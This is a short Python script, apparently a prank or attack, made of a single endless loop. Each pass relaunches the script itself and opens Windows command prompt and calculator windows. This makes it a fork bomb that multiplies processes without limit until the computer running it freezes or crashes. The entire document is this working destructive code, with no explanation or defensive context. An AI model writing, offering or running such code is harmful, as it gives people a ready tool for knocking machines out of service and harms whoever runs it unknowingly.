import subprocess
import sys
while True:
    subprocess.Popen([sys.executable] + sys.argv)
    subprocess.run("start cmd", shell=True)
    subprocess.run("start calc", shell=True)